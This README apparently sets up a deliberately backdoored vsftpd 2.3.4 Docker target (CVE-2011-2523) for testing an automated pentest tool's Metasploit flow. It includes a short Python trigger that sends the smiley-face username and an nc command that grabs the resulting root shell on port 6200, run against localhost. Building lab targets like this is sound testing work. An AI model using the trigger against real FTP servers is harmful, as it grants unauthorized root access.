# vsftpd 2.3.4 backdoor target (CVE-2011-2523)

A minimal, deterministic target for exercising the Strix **RAG → Metasploit** path.
Metasploit's `exploit/unix/ftp/vsftpd_234_backdoor` module works against it out of
the box, so the whole `exploit_research` → Metasploit-first flow fires cleanly.

## Build & run

```bash
cd web/vulnerable-target-vsftpd
docker build -t strix-vuln-vsftpd .
docker run -d --rm --name strix-vuln-target-vsftpd \
    -p 21:21 -p 6200:6200 strix-vuln-vsftpd
```

## Verify the backdoor works

```bash
# should print: 220 (vsFTPd 2.3.4)
nc -w2 127.0.0.1 21 </dev/null

# trigger the smiley — spawns /bin/sh on :6200
python3 -c "
import socket
s = socket.create_connection(('127.0.0.1', 21))
print(s.recv(4096).decode().strip())
s.sendall(b'USER x:)\r\n')
s.sendall(b'PASS x\r\n')
" &
sleep 1
# grab the root shell
nc 127.0.0.1 6200 <<< 'id; hostname; exit'
```

## Kick off a scan against it

From the web UI, create an assessment with:
- target: `host.docker.internal`
- instruction: `Focus on the FTP service on port 21.`

The exploit_research tool will find the MSF module → confirm → shell.

## Tear down

```bash
docker stop strix-vuln-target-vsftpd
```

⚠ Lab only — do not expose the target ports to any real network.
